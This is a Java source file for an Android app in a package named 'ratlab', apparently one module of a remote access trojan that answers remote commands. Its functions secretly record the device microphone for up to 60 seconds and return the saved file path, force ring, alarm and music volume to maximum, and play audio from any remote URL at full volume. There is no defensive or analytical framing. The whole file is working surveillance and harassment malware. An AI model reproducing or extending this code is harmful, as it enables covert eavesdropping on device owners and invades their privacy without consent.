package com.ratlab;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;

import java.io.File;

public class AudioModule {

    private final Context ctx;
    private MediaPlayer player;
    private MediaRecorder recorder;

    public AudioModule(Context ctx) {
        this.ctx = ctx;
    }

    public String play(String url) {
        try {
            if (url.isEmpty()) return "Format: /play <url>";
            if (player != null) { player.release(); player = null; }
            player = new MediaPlayer();
            player.setDataSource(url);
            player.prepareAsync();
            player.setOnPreparedListener(mp -> {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                mp.start();
            });
            return "Playing: " + url;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String maxVolume() {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            return "Volume: MAX";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public static String setVolume(Context ctx, String level) {
        try {
            int lvl = Integer.parseInt(level);
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            if (lvl < 0) lvl = 0;
            if (lvl > max) lvl = max;
            am.setStreamVolume(AudioManager.STREAM_MUSIC, lvl, 0);
            return "Volume: " + lvl + "/" + max;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String record(String duration) {
        try {
            int sec = duration.isEmpty() ? 10 : Integer.parseInt(duration);
            if (sec > 60) sec = 60;
            File out = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".m4a");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(out.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(sec * 1000L);
            recorder.stop();
            recorder.release();
            recorder = null;
            return "FILE:" + out.getAbsolutePath();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
